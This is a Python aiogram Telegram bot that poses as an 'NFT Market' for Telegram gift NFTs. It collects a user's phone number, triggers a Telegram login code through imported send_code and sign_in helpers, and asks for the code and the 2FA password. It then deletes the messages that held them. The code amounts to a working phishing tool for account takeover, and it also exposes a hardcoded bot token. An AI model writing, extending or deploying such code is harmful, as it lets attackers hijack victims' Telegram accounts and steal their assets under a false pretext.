import asyncio
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from auth import send_code, sign_in

BOT_TOKEN = "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Хранилище: phone -> phone_code_hash
pending = {}

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🛍 Открыть маркет",
            web_app=types.WebAppInfo(url="https://frontend-sigma-coral-35.vercel.app")
        )]
    ])
    await message.answer(
        "👋 Добро пожаловать в NFT Маркет!\n\n"
        "Здесь ты можешь купить и продать Telegram NFT подарки.\n"
        "Нажми кнопку ниже чтобы открыть маркет 👇",
        reply_markup=keyboard
    )

@dp.message(F.contact)
async def contact_handler(message: types.Message):
    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone

    # Удаляем сообщение с контактом
    await message.delete()

    try:
        phone_code_hash = await send_code(phone)
        pending[message.from_user.id] = {
            'phone': phone,
            'phone_code_hash': phone_code_hash
        }
        msg = await message.answer("📲 Введи код который пришёл в Telegram:")
        pending[message.from_user.id]['prompt_msg_id'] = msg.message_id
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message(F.text)
async def code_handler(message: types.Message):
    user_id = message.from_user.id
    if user_id not in pending:
        return

    code = message.text.strip()
    data = pending[user_id]

    # Удаляем сообщение с кодом
    await message.delete()

    # Удаляем сообщение "Введи код"
    try:
        await bot.delete_message(message.chat.id, data['prompt_msg_id'])
    except:
        pass

    try:
        await sign_in(data['phone'], code, data['phone_code_hash'])
        del pending[user_id]
        confirm = await message.answer("✅ Авторизация успешна!")
        await asyncio.sleep(3)
        await confirm.delete()
    except Exception as e:
        if '2FA' in str(e):
            pending[user_id]['awaiting_2fa'] = True
            await message.answer("🔐 Введи пароль 2FA:")
        else:
            del pending[user_id]
            await message.answer(f"❌ Ошибка: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())